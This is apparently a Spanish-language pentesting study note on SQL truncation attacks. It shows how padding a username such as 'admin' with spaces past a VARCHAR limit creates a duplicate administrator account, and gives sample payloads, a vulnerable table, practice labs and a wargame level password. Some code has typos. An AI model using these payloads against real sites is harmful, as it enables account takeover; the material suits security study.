Si la base de datos considera los espacios como caracteres válidos entre las entradas y no realiza ningún recorte antes de almacenar los valores, un atacante puede crear cuentas duplicadas de un usuario existente como **_''admin''_** con muchos espacios y caracteres adicionales: **_''admin+ +++++random''_** que son demasiado largos para almacenarse en la columna especificada y se eliminan después de pasar la longitud máxima.

Entonces, en lugar de almacenar **" _admin++++++random''_** como una entrada, la base de datos truncará la segunda mitad para que quepa en la columna **_(''admin +++++'')._**

```bash
“administrador” == 'administrador +++++'
```

La vulnerabilidad de truncamiento de SQL suele existir en las bases de datos MySQL. Esta vulnerabilidad se describió por primera vez en CVE-2008-4106, que estaba relacionada con WordPress CMS.

### EXPLICACION

Supongamos que los desarrolladores crean una tabla como la siguiente:

```sql
creta table users(
	user_id INT NOT NULL AUTO_INCREMENT,
	user_name VARCHAR(20) NOT NULL,
	password VARCHAR(40) NOT NULL,
	PRIMARY KEY (user_id)
);
```

sabemos que:

- username tiene una longitud de 20 caracteres.
- la pagina valida que no haya duplicidad de username.

supongamos que ya hay un usuario registrado con el nombre `admin` y es administrador. Si queremoscrear otro usuario con ese **username** no nos dejaria.

Para evadir esto un atacante puede crear el nombre de usuario `admin` junto a 20 espacios y una palabra o caracter random al final:

```bash
#los + son espacios
admin++++++++++++++++++++a 
```

La base de datos tomará el 'nombre_usuario' (26 caracteres) y comprobará si ya existe. Luego, la entrada del nombre de usuario se truncará y se ingresará 'admin' ('admin' con espacio) en la base de datos, lo que dará como resultado dos usuarios administradores duplicados.

ahora podemos inter iniciar sesion con algunos de estos nombres de usuario y nuestra contraseña creada:

```bash
admin
admin++++++++++++++++++++a
admin++++++++++++++++++++
```

### POC

```bash
# los + son espacios

admin++++++++

admin++++++++++hacker
```

### MITIGACIONES

- [https://linuxhint.com/sql-truncation-attack/](https://linuxhint.com/sql-truncation-attack/)

### PRACTICA

- HTB - Book
- overthewire natas
	- [http://natas27.natas.labs.overthewire.org](http://natas27.natas.labs.overthewire.org)
	- username:  natas27
	- pass: 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ

## BYPASS CAPTCHA
## OAUTH BYPASS
## OTP BYPASS
